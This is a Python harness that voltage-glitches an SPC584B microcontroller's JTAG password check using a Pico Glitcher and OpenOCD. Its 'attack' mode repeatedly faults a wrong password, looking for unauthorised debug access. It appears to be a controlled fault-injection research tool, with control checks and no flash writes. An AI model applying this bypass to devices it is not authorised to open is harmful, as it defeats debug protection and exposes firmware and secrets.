#!/usr/bin/env python3
"""Calibrate and fault the SPC584B JTAG-password transaction.

The experiment sends one uninterrupted 256-bit password scan. The Pico
Glitcher counts TCK edges from the start of that scan and fires early enough
for a delayed pulse to land before, during, or after the final scan clocks.

Four explicit modes are provided:

* edge-map: emit scope markers with the glitch lead physically disconnected;
* characterize: send the correct password and stop on the first changed result;
* sensitivity-map: map correct-password pass/fail behavior across a full grid;
* attack: send a one-bit-wrong password and stop on unexpected debug access.

OpenOCD remains alive across attempts and is restarted only if its Tcl session
becomes unusable. This script never writes flash, UTEST, DCF, lifecycle, or
OTP. Results are printed to stdout. Sensitivity maps are also written to an
explicit CSV path so an interrupted run retains every completed attempt.
"""

from __future__ import annotations

import argparse
import csv
from collections import deque
from dataclasses import dataclass
import os
from pathlib import Path
import random
import re
import shutil
import socket
import stat
import struct
import subprocess
import sys
import threading
import time

from findus import PicoGlitcher
from findus.pyboard import PyboardError


EXPECTED_IDCODE = 0x20144041
IDCODE_INSTRUCTION = 0x01
PASS_LCSTAT = 0xF7FF4000
PASSWORD_BYTES = 32
PASSWORD_INSTRUCTION = 0x07
DCI_CONTROL_INSTRUCTION = 0x0E
DCI_DESTRUCTIVE_RESET = 1 << 8
RPC_TOKEN = b"\x1a"
TRIGGER_TIMEOUT_MARKER = "Function execution timed out!"

EXIT_NO_CANDIDATE = 0
EXIT_ERROR = 2
EXIT_CANDIDATE = 10


class ExperimentError(RuntimeError):
    pass


@dataclass(frozen=True)
class Point:
    delay_ns: int
    length_ns: int
    repeat: int


@dataclass(frozen=True)
class Result:
    state: str
    detail: str

    @property
    def access_observed(self) -> bool:
        return self.state.startswith("ACCESS_")


class OpenOCDSession:
    """One bounded OpenOCD process with a local Tcl connection."""

    def __init__(self, executable: str, adapter_speed_khz: int):
        self.executable = executable
        self.adapter_speed_khz = adapter_speed_khz
        self.port = reserve_local_port()
        self.process: subprocess.Popen[str] | None = None
        self.sock: socket.socket | None = None
        self.output: deque[str] = deque(maxlen=1000)
        self.halted = False
        self.preserve_halt = False

    def command_line(self) -> list[str]:
        commands = [
            "bindto 127.0.0.1",
            "adapter driver ftdi",
            "ftdi vid_pid 0x263d 0x4001",
            "ftdi channel 0",
            "ftdi layout_init 0x0008 0x000b",
            "ftdi layout_signal nTRST -data 0x0100 -oe 0x0100",
            "ftdi layout_signal nSRST -ndata 0x2000 -oe 0x2000",
            f"adapter speed {self.adapter_speed_khz}",
            "transport select jtag",
            "reset_config trst_and_srst",
            (
                "jtag newtap spc584b tap -irlen 6 "
                f"-expected-id 0x{EXPECTED_IDCODE:08x}"
            ),
            (
                "target create spc584b.cpu powerpc -endian big "
                "-chain-position spc584b.tap"
            ),
            "gdb_port disabled",
            "telnet_port disabled",
            f"tcl_port {self.port}",
        ]
        command = [self.executable]
        for item in commands:
            command.extend(("-c", item))
        return command

    def _collect_output(self) -> None:
        assert self.process is not None and self.process.stdout is not None
        for line in self.process.stdout:
            self.output.append(line)

    def __enter__(self) -> "OpenOCDSession":
        self.process = subprocess.Popen(
            self.command_line(),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
        threading.Thread(target=self._collect_output, daemon=True).start()

        try:
            deadline = time.monotonic() + 10
            while time.monotonic() < deadline:
                if self.process.poll() is not None:
                    raise ExperimentError(
                        "OpenOCD exited during startup:\n" + "".join(self.output)
                    )
                try:
                    self.sock = socket.create_connection(
                        ("127.0.0.1", self.port), timeout=0.5
                    )
                    self.sock.settimeout(10)
                    break
                except OSError:
                    time.sleep(0.05)
            else:
                raise ExperimentError("timed out waiting for OpenOCD")

            self.command("init")
            self.command("poll off")
            return self
        except Exception:
            self.close()
            raise

    def rpc(self, script: str) -> str:
        if self.sock is None:
            raise ExperimentError("OpenOCD Tcl connection is unavailable")
        self.sock.sendall(script.encode() + RPC_TOKEN)
        chunks: list[bytes] = []
        while True:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise ExperimentError("OpenOCD closed the Tcl connection")
            if RPC_TOKEN in chunk:
                before, _, _ = chunk.partition(RPC_TOKEN)
                chunks.append(before)
                return b"".join(chunks).decode(errors="replace")
            chunks.append(chunk)

    def command(self, command: str, label: str | None = None) -> str:
        response = self.rpc(
            f"set __spc_rc [catch {{{command}}} __spc_msg]; "
            "list $__spc_rc $__spc_msg"
        ).strip()
        match = re.match(r"^(-?\d+)(?:\s+(.*))?$", response, re.DOTALL)
        if not match:
            raise ExperimentError(f"unexpected OpenOCD response: {response!r}")
        message = (match.group(2) or "").strip()
        if len(message) >= 2 and message[0] == "{" and message[-1] == "}":
            message = message[1:-1]
        if match.group(1) != "0":
            raise ExperimentError(
                f"OpenOCD command failed: {label or command}\n{message}"
            )
        return message

    def read_word(self, address: int) -> int:
        response = self.command(f"read_memory 0x{address:08x} 32 1")
        words = re.findall(r"(?:0x[0-9a-fA-F]+)|(?:\b[0-9]+\b)", response)
        if len(words) != 1:
            raise ExperimentError(
                f"read at 0x{address:08x} returned {len(words)} words"
            )
        return int(words[0], 0) & 0xFFFFFFFF

    def close(self) -> None:
        if self.sock is not None:
            if self.halted and not self.preserve_halt:
                try:
                    self.command("resume")
                except Exception:
                    pass
            try:
                self.rpc("shutdown")
            except Exception:
                pass
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

        if self.process is not None:
            try:
                self.process.wait(timeout=3)
            except subprocess.TimeoutExpired:
                self.process.terminate()
                try:
                    self.process.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    self.process.kill()
            self.process = None

    def __exit__(self, exc_type: object, exc: object, traceback: object) -> None:
        self.close()


def reserve_local_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.bind(("127.0.0.1", 0))
        return int(listener.getsockname()[1])


def compact_error(error: Exception) -> str:
    return " | ".join(line.strip() for line in str(error).splitlines() if line.strip())


def find_openocd() -> str:
    configured = os.environ.get("SPC_OPENOCD")
    if not configured:
        raise ExperimentError(
            "SPC_OPENOCD must point to ST's openocd-automotive-mcu-r1 build"
        )
    executable = shutil.which(configured)
    if executable is None:
        raise ExperimentError(f"OpenOCD not found: {configured}")

    try:
        probe = subprocess.run(
            [executable, "-c", "target types", "-c", "shutdown"],
            capture_output=True,
            text=True,
            timeout=10,
            check=False,
        )
    except (OSError, subprocess.TimeoutExpired) as error:
        raise ExperimentError(f"could not validate OpenOCD: {error}") from error
    if probe.returncode != 0:
        raise ExperimentError(
            f"OpenOCD capability check exited with status {probe.returncode}"
        )
    if "powerpc" not in f"{probe.stdout}\n{probe.stderr}".split():
        raise ExperimentError("SPC_OPENOCD does not provide the powerpc target")
    return executable


def read_password(path: Path) -> bytes:
    try:
        password = path.read_bytes()
        mode = stat.S_IMODE(path.stat().st_mode)
    except OSError as error:
        raise ExperimentError(f"cannot read password file {path}: {error}") from error
    if len(password) != PASSWORD_BYTES:
        raise ExperimentError(f"password file must be exactly {PASSWORD_BYTES} bytes")
    if password in (b"\x00" * PASSWORD_BYTES, b"\xff" * PASSWORD_BYTES):
        raise ExperimentError("refusing an all-zero or all-0xff password")
    if mode & 0o077:
        raise ExperimentError(
            f"password file permissions are {mode:04o}; run: chmod 600 {path}"
        )
    return password


def password_words(password: bytes, *, wrong: bool) -> tuple[int, ...]:
    value = bytearray(password)
    if wrong:
        value[0] ^= 0x01
    return struct.unpack(">8I", value)


def password_scan_command(words: tuple[int, ...]) -> str:
    if len(words) != 8:
        raise ExperimentError("JTAG password must contain eight words")
    fields = " ".join(f"32 0x{word:08x}" for word in words)
    return f"drscan spc584b.tap {fields}"


def read_idcode(session: OpenOCDSession) -> int:
    """Read the always-available TAP IDCODE without probing locked CPU debug."""
    session.command(f"irscan spc584b.tap 0x{IDCODE_INSTRUCTION:02x}")
    response = session.command("drscan spc584b.tap 32 0x00000000").strip()
    match = re.fullmatch(r"(?:0x)?([0-9a-fA-F]{1,8})", response)
    if match is None:
        raise ExperimentError(f"could not parse JTAG IDCODE response: {response!r}")
    return int(match.group(1), 16)


def reset_target(session: OpenOCDSession, hold_ms: int) -> None:
    if session.halted:
        # Let OpenOCD finish leaving OnCE debug before switching back to raw
        # JTAGC instructions.  Issuing DCI_CR immediately after resume leaves
        # the following instruction/data scans misaligned on this target.
        session.command("resume")
        time.sleep(0.2)
    session.command(f"irscan spc584b.tap 0x{DCI_CONTROL_INSTRUCTION:02x}")
    session.command(
        f"drscan spc584b.tap 32 0x{DCI_DESTRUCTIVE_RESET:08x}"
    )
    time.sleep(hold_ms / 1000)
    session.command(f"irscan spc584b.tap 0x{DCI_CONTROL_INSTRUCTION:02x}")
    session.command("drscan spc584b.tap 32 0x00000000")
    session.command("jtag arp_init")
    session.halted = False
    session.preserve_halt = False


def reset_and_verify_target(
    session: OpenOCDSession, hold_ms: int, retries: int
) -> None:
    """Re-arm password security and prove the external FTDI still sees the TAP."""
    observed: list[str] = []
    for _ in range(retries + 1):
        try:
            reset_target(session, hold_ms)
            idcode = read_idcode(session)
            observed.append(f"0x{idcode:08x}")
            if idcode == EXPECTED_IDCODE:
                return
        except ExperimentError as error:
            observed.append(compact_error(error))
    raise ExperimentError(
        "target failed post-reset IDCODE health gate: " + ",".join(observed)
    )


def select_password_register(session: OpenOCDSession) -> None:
    session.command(f"irscan spc584b.tap 0x{PASSWORD_INSTRUCTION:02x}")


def wait_for_trigger(glitcher: PicoGlitcher, timeout: float) -> bool:
    try:
        glitcher.block(timeout=timeout)
    except PyboardError as error:
        message = " ".join(
            item.decode(errors="replace") if isinstance(item, bytes) else str(item)
            for item in error.args
        )
        if TRIGGER_TIMEOUT_MARKER in message:
            return False
        raise
    return True


def probe_debug(session: OpenOCDSession, halt_timeout_ms: int) -> Result:
    try:
        session.command("halt 0")
        session.command(f"wait_halt {halt_timeout_ms}")
        session.halted = True
    except ExperimentError as error:
        session.halted = False
        return Result("LOCKED_OR_UNRESPONSIVE", compact_error(error))

    try:
        registers = session.command("get_reg -force {pc msr r0}")
        target_state = session.command("spc584b.cpu curstate")
    except ExperimentError as error:
        return Result("ORACLE_ERROR", compact_error(error))

    try:
        lcstats = tuple(session.read_word(PASS_LCSTAT) for _ in range(3))
    except ExperimentError as error:
        return Result(
            "ACCESS_LCSTAT_UNREADABLE",
            f"registers={registers};state={target_state};lcstat_error={compact_error(error)}",
        )

    lcstat = lcstats[0]
    stable = len(set(lcstats)) == 1
    valid = lcstat not in (0x00000000, 0xFFFFFFFF)
    jun = 1 if lcstat & (1 << 30) else 0
    samples = ",".join(f"0x{value:08x}" for value in lcstats)
    detail = (
        f"registers={registers};state={target_state};lcstats={samples};"
        f"stable={int(stable)};valid={int(valid)};jun={jun};lc={lcstat & 0x7}"
    )
    if not stable:
        return Result("ACCESS_LCSTAT_UNSTABLE", detail)
    if not valid:
        return Result("ACCESS_LCSTAT_INVALID", detail)
    state = "ACCESS_JUN_SET" if jun else "ACCESS_JUN_CLEAR"
    return Result(state, detail)


def submit_without_glitch(
    session: OpenOCDSession,
    words: tuple[int, ...],
    args: argparse.Namespace,
) -> Result:
    reset_and_verify_target(session, args.reset_hold_ms, args.health_retries)
    select_password_register(session)
    session.command(
        password_scan_command(words),
        "<redacted uninterrupted 256-bit JTAG password scan>",
    )
    return probe_debug(session, args.control_halt_timeout_ms)


def run_controls(
    session: OpenOCDSession,
    correct_words: tuple[int, ...],
    wrong_words: tuple[int, ...],
    args: argparse.Namespace,
) -> None:
    correct = submit_without_glitch(session, correct_words, args)
    print(f"CONTROL password=correct result={correct.state} detail={correct.detail}")
    if correct.state != "ACCESS_JUN_SET":
        raise ExperimentError(
            f"correct-password control failed without a glitch: {correct.state}"
        )

    wrong = submit_without_glitch(session, wrong_words, args)
    print(f"CONTROL password=wrong result={wrong.state} detail={wrong.detail}")
    if wrong.state != "LOCKED_OR_UNRESPONSIVE":
        raise ExperimentError(
            f"wrong-password control did not produce the expected locked response: "
            f"{wrong.state}"
        )


def run_glitched_submission(
    session: OpenOCDSession,
    glitcher: PicoGlitcher,
    words: tuple[int, ...],
    point: Point,
    args: argparse.Namespace,
) -> Result:
    reset_and_verify_target(session, args.reset_hold_ms, args.health_retries)
    select_password_register(session)

    glitcher.edge_count_trigger(
        pin_trigger=args.trigger_input,
        number_of_edges=args.edge_count,
        edge_type="rising",
    )
    glitcher.arm(point.delay_ns, point.length_ns)

    scan_error: ExperimentError | None = None
    try:
        session.command(
            password_scan_command(words),
            "<redacted uninterrupted 256-bit JTAG password scan>",
        )
    except ExperimentError as error:
        scan_error = error

    if not wait_for_trigger(glitcher, args.block_timeout):
        return Result("TRIGGER_TIMEOUT", TRIGGER_TIMEOUT_MARKER)

    result = probe_debug(session, args.halt_timeout_ms)
    if result.access_observed and args.mode == "attack":
        session.preserve_halt = True

    if scan_error is None:
        return result
    detail = f"scan_error={compact_error(scan_error)};probe={result.detail}"
    if result.access_observed:
        return Result(result.state, detail)
    return Result("SCAN_OR_TARGET_FAULT", detail)


def emit_edge_marker(
    session: OpenOCDSession,
    glitcher: PicoGlitcher,
    words: tuple[int, ...],
    edge_count: int,
    args: argparse.Namespace,
) -> bool:
    """Emit a scope marker; GLITCH must be disconnected from the target rail."""
    reset_and_verify_target(session, args.reset_hold_ms, args.health_retries)
    select_password_register(session)
    glitcher.edge_count_trigger(
        pin_trigger=args.trigger_input,
        number_of_edges=edge_count,
        edge_type="rising",
    )
    glitcher.arm(0, args.marker_length_ns)
    session.command(
        password_scan_command(words),
        "<redacted uninterrupted 256-bit JTAG password scan>",
    )
    return wait_for_trigger(glitcher, args.block_timeout)


def inclusive_values(bounds: tuple[int, int], step: int) -> range:
    low, high = bounds
    first = ((low + step - 1) // step) * step
    return range(first, high + 1, step)


def build_points(args: argparse.Namespace) -> list[Point]:
    points = [
        Point(delay, length, repeat)
        for delay in inclusive_values(tuple(args.delay), args.step_ns)
        for length in inclusive_values(tuple(args.length), args.step_ns)
        for repeat in range(args.repeats)
    ]
    if not points:
        raise ExperimentError("the requested timing grid is empty")
    random.Random(args.seed).shuffle(points)
    if args.attempts:
        points = points[: args.attempts]
    return points


def summarize_sensitivity(
    cells: dict[tuple[int, int], dict[str, int]], step_ns: int
) -> None:
    def accepted(counts: dict[str, int]) -> int:
        return counts.get("ACCESS_JUN_SET", 0)

    def changed(counts: dict[str, int]) -> int:
        return sum(
            count for state, count in counts.items() if state != "ACCESS_JUN_SET"
        )

    stable_pass = {
        point
        for point, counts in cells.items()
        if accepted(counts) and not changed(counts)
    }
    stable_changed = {
        point
        for point, counts in cells.items()
        if changed(counts) and not accepted(counts)
    }
    mixed = set(cells) - stable_pass - stable_changed
    boundary = {
        point
        for point in stable_changed
        if any(
            neighbor in stable_pass
            for neighbor in (
                (point[0] - step_ns, point[1]),
                (point[0] + step_ns, point[1]),
                (point[0], point[1] - step_ns),
                (point[0], point[1] + step_ns),
            )
        )
    }

    print(
        "SENSITIVITY_SUMMARY "
        f"cells={len(cells)} stable_pass={len(stable_pass)} "
        f"stable_changed={len(stable_changed)} mixed={len(mixed)} "
        f"boundary_changed={len(boundary)}",
        flush=True,
    )
    for delay_ns, length_ns in sorted(mixed):
        counts = cells[(delay_ns, length_ns)]
        print(
            "SENSITIVITY_MIXED "
            f"delay_ns={delay_ns} length_ns={length_ns} "
            f"accepted={accepted(counts)} changed={changed(counts)}",
            flush=True,
        )
    for delay_ns, length_ns in sorted(boundary):
        counts = cells[(delay_ns, length_ns)]
        states = ",".join(
            f"{state}:{count}" for state, count in sorted(counts.items())
        )
        print(
            "SENSITIVITY_BOUNDARY "
            f"delay_ns={delay_ns} length_ns={length_ns} states={states}",
            flush=True,
        )


def apply_mode_defaults(args: argparse.Namespace) -> None:
    if args.repeats is None:
        args.repeats = 100 if args.mode == "attack" else 1
    if args.attempts is None:
        args.attempts = 100_000 if args.mode == "attack" else 0


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--mode",
        required=True,
        choices=("edge-map", "characterize", "sensitivity-map", "attack"),
        help=(
            "edge-map emits safe scope markers; characterize faults a correct "
            "password and stops on change; sensitivity-map records the full "
            "correct-password grid; attack faults a one-bit-wrong password"
        ),
    )
    parser.add_argument("--rpico", required=True, help="Pico Glitcher serial port")
    parser.add_argument(
        "--password-file",
        required=True,
        type=Path,
        help="32-byte SPC584B JTAG password file",
    )
    parser.add_argument(
        "--edge-count",
        type=int,
        metavar="EDGE",
        help="one TCK edge count for characterize/sensitivity-map/attack",
    )
    parser.add_argument(
        "--edge-range",
        nargs=2,
        type=int,
        default=(252, 264),
        metavar=("MIN", "MAX"),
        help="inclusive edge-map range (default: 252 264)",
    )
    parser.add_argument(
        "--marker-length-ns",
        type=int,
        default=8,
        help="scope-marker pulse width in edge-map mode (default: 8)",
    )
    parser.add_argument(
        "--confirm-glitch-disconnected",
        action="store_true",
        help="confirm GLITCH is physically disconnected from the target rail",
    )
    parser.add_argument("--delay", nargs=2, type=int, default=(0, 1000))
    parser.add_argument("--length", nargs=2, type=int, default=(8, 28))
    parser.add_argument("--step-ns", type=int, default=4)
    parser.add_argument(
        "--attempts",
        type=int,
        help=(
            "maximum shuffled attempts; 0 runs the complete grid "
            "(defaults: characterize/sensitivity-map=complete grid, attack=100000)"
        ),
    )
    parser.add_argument(
        "--repeats",
        type=int,
        help=(
            "repetitions per grid point "
            "(defaults: characterize/sensitivity-map=1, attack=100)"
        ),
    )
    parser.add_argument("--seed", type=int, default=584)
    parser.add_argument(
        "--output",
        type=Path,
        help="new CSV output path (required for sensitivity-map)",
    )
    parser.add_argument(
        "--trigger-input",
        default="default",
        choices=("default", "alt", "ext1", "ext2"),
    )
    parser.add_argument("--adapter-speed-khz", type=int, default=1000)
    parser.add_argument("--reset-hold-ms", type=int, default=200)
    parser.add_argument(
        "--health-retries",
        type=int,
        default=3,
        help="post-reset IDCODE recovery retries before aborting (default: 3)",
    )
    parser.add_argument("--halt-timeout-ms", type=int, default=100)
    parser.add_argument("--control-halt-timeout-ms", type=int, default=2000)
    parser.add_argument("--block-timeout", type=float, default=2.0)
    parser.add_argument(
        "--high-power",
        action="store_true",
        help="use the high-power crowbar only after validating it on a scope",
    )
    return parser.parse_args()


def validate_args(args: argparse.Namespace) -> None:
    for name in ("delay", "length"):
        low, high = getattr(args, name)
        if low < 0 or high < low:
            raise ExperimentError(f"invalid --{name.replace('_', '-')} range")
    edge_low, edge_high = args.edge_range
    if edge_low < 1 or edge_high < edge_low:
        raise ExperimentError("invalid --edge-range")
    if args.mode == "edge-map":
        if not args.confirm_glitch_disconnected:
            raise ExperimentError(
                "edge-map requires --confirm-glitch-disconnected after physically "
                "disconnecting GLITCH from the target rail"
            )
    elif args.edge_count is None or args.edge_count < 1:
        raise ExperimentError(
            "characterize/sensitivity-map/attack require one positive --edge-count"
        )
    if args.mode == "sensitivity-map" and args.output is None:
        raise ExperimentError("sensitivity-map requires --output")
    if args.output is not None and args.mode != "sensitivity-map":
        raise ExperimentError("--output is currently supported only by sensitivity-map")
    if args.marker_length_ns <= 0:
        raise ExperimentError("--marker-length-ns must be positive")
    if args.step_ns <= 0:
        raise ExperimentError("--step-ns must be positive")
    if args.attempts is not None and args.attempts < 0:
        raise ExperimentError("--attempts cannot be negative")
    if args.repeats is not None and args.repeats <= 0:
        raise ExperimentError("--repeats must be positive")
    if args.adapter_speed_khz <= 0:
        raise ExperimentError("--adapter-speed-khz must be positive")
    if args.reset_hold_ms < 0:
        raise ExperimentError("--reset-hold-ms cannot be negative")
    if args.health_retries < 0:
        raise ExperimentError("--health-retries cannot be negative")
    if args.halt_timeout_ms <= 0 or args.control_halt_timeout_ms <= 0:
        raise ExperimentError("halt timeouts must be positive")
    if args.block_timeout <= 0:
        raise ExperimentError("--block-timeout must be positive")


def main() -> int:
    args = parse_args()
    session: OpenOCDSession | None = None
    output_file = None
    try:
        validate_args(args)
        apply_mode_defaults(args)
        openocd = find_openocd()
        password = read_password(args.password_file)
        correct_words = password_words(password, wrong=False)
        wrong_words = password_words(password, wrong=True)

        glitcher = PicoGlitcher()
        try:
            glitcher.init(port=args.rpico, enable_vtarget=False)
        except SystemExit as error:
            raise ExperimentError(
                f"PicoGlitcher initialization exited with status {error.code}"
            ) from error

        frequency_hz = int(glitcher.get_cpu_frequency())
        if frequency_hz <= 0 or 1_000_000_000 % frequency_hz:
            raise ExperimentError(
                f"unsupported PicoGlitcher frequency: {frequency_hz} Hz"
            )
        tick_ns = 1_000_000_000 // frequency_hz
        if args.mode != "edge-map" and args.step_ns % tick_ns:
            raise ExperimentError(
                f"--step-ns must be a multiple of the Pico timing tick ({tick_ns} ns)"
            )
        if args.mode == "edge-map" and args.marker_length_ns % tick_ns:
            raise ExperimentError(
                "--marker-length-ns must be a multiple of the Pico timing tick "
                f"({tick_ns} ns)"
            )

        if args.high_power:
            glitcher.set_hpglitch()
        else:
            glitcher.set_lpglitch()

        print(f"MODE={args.mode}", flush=True)
        print("PASSWORD_SCAN=UNINTERRUPTED_256_BIT_DRSCAN", flush=True)
        print("TRIGGER_REFERENCE=TCK_EDGES_AFTER_PASSWORD_IR_SELECTION", flush=True)
        print("JTAG_CONTROLLER=EXTERNAL_FTDI_PERSISTENT_OPENOCD", flush=True)
        print("TARGET_REARM=DCI_DESTRUCTIVE_RESET_POWER_CYCLE_EQUIVALENT", flush=True)
        print("PRE_SHOT_GATE=EXPECTED_IDCODE", flush=True)
        print("POST_SHOT_ORACLE=HALT_REGISTERS_LCSTAT_X3", flush=True)
        print(f"PICO_PIO_TICK_NS={tick_ns}", flush=True)

        session = OpenOCDSession(openocd, args.adapter_speed_khz).__enter__()
        run_controls(session, correct_words, wrong_words, args)

        if args.mode == "edge-map":
            print("GLITCH_TARGET_CONNECTION=DISCONNECTED_CONFIRMED", flush=True)
            print("EDGE_MAPPING_REQUIRES_OSCILLOSCOPE=yes", flush=True)
            for edge_count in range(args.edge_range[0], args.edge_range[1] + 1):
                observed = emit_edge_marker(
                    session, glitcher, wrong_words, edge_count, args
                )
                print(
                    f"EDGE_MAP edge_count={edge_count} marker_observed="
                    f"{'yes' if observed else 'no'}",
                    flush=True,
                )
            print("EXPERIMENT_RESULT=EDGE_MAP_COMPLETE", flush=True)
            return EXIT_NO_CANDIDATE

        points = build_points(args)
        print(f"CALIBRATED_EDGE_COUNT={args.edge_count}", flush=True)
        print(f"POINTS_THIS_RUN={len(points)}", flush=True)

        csv_writer = None
        sensitivity_cells: dict[tuple[int, int], dict[str, int]] = {}
        if args.mode == "sensitivity-map":
            assert args.output is not None
            args.output.parent.mkdir(parents=True, exist_ok=True)
            try:
                output_file = args.output.open("x", newline="")
            except FileExistsError as error:
                raise ExperimentError(
                    f"refusing to overwrite sensitivity CSV: {args.output}"
                ) from error
            csv_writer = csv.writer(output_file)
            csv_writer.writerow(
                (
                    "timestamp_utc",
                    "attempt",
                    "edge_count",
                    "delay_ns",
                    "length_ns",
                    "repeat",
                    "result",
                    "access_observed",
                    "detail",
                )
            )
            output_file.flush()
            print(f"RESULTS_CSV={args.output}", flush=True)

        words = (
            correct_words
            if args.mode in ("characterize", "sensitivity-map")
            else wrong_words
        )
        started = time.monotonic()
        for attempt, point in enumerate(points):
            try:
                result = run_glitched_submission(
                    session, glitcher, words, point, args
                )
            except ExperimentError as first_error:
                print(
                    f"SESSION_RESTART attempt={attempt} "
                    f"reason={compact_error(first_error)}",
                    flush=True,
                )
                session.close()
                session = OpenOCDSession(
                    openocd, args.adapter_speed_khz
                ).__enter__()
                run_controls(session, correct_words, wrong_words, args)
                result = run_glitched_submission(
                    session, glitcher, words, point, args
                )
            elapsed = max(time.monotonic() - started, 0.001)
            print(
                f"ATTEMPT={attempt} edge_count={args.edge_count} "
                f"delay_ns={point.delay_ns} length_ns={point.length_ns} "
                f"repeat={point.repeat} result={result.state} "
                f"rate={(attempt + 1) / elapsed:.2f}/s detail={result.detail}",
                flush=True,
            )

            if csv_writer is not None:
                csv_writer.writerow(
                    (
                        time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                        attempt,
                        args.edge_count,
                        point.delay_ns,
                        point.length_ns,
                        point.repeat,
                        result.state,
                        int(result.access_observed),
                        result.detail,
                    )
                )
                assert output_file is not None
                output_file.flush()
                counts = sensitivity_cells.setdefault(
                    (point.delay_ns, point.length_ns), {}
                )
                counts[result.state] = counts.get(result.state, 0) + 1

            if result.state == "TRIGGER_TIMEOUT":
                raise ExperimentError(
                    f"edge count {args.edge_count} was not observed during the scan"
                )

            if args.mode == "attack" and result.access_observed:
                print(
                    "EXPERIMENT_RESULT=ACCESS_CANDIDATE "
                    f"edge_count={args.edge_count} delay_ns={point.delay_ns} "
                    f"length_ns={point.length_ns} repeat={point.repeat}",
                    flush=True,
                )
                print("DEVICE_LEFT_HALTED_WITHOUT_RESET=yes", flush=True)
                return EXIT_CANDIDATE

            if args.mode == "characterize" and result.state != "ACCESS_JUN_SET":
                print(
                    "EXPERIMENT_RESULT=FAULT_OBSERVED "
                    f"edge_count={args.edge_count} delay_ns={point.delay_ns} "
                    f"length_ns={point.length_ns} repeat={point.repeat} "
                    f"result={result.state}",
                    flush=True,
                )
                print(
                    "INTERPRETATION=physical_effect_not_password_compare_proof",
                    flush=True,
                )
                return EXIT_CANDIDATE

        if args.mode == "sensitivity-map":
            summarize_sensitivity(sensitivity_cells, args.step_ns)
            print("EXPERIMENT_RESULT=SENSITIVITY_MAP_COMPLETE", flush=True)
            return EXIT_NO_CANDIDATE

        final = (
            "NO_FAULT_OBSERVED"
            if args.mode == "characterize"
            else "NO_ACCESS_OBSERVED"
        )
        print(f"EXPERIMENT_RESULT={final}", flush=True)
        return EXIT_NO_CANDIDATE
    except KeyboardInterrupt:
        print("\nEXPERIMENT_RESULT=INTERRUPTED", flush=True)
        return 130
    except Exception as error:
        print(
            f"EXPERIMENT_RESULT=ERROR type={type(error).__name__} reason={error}",
            file=sys.stderr,
            flush=True,
        )
        return EXIT_ERROR
    finally:
        if output_file is not None:
            output_file.close()
        if session is not None:
            session.close()


if __name__ == "__main__":
    raise SystemExit(main())
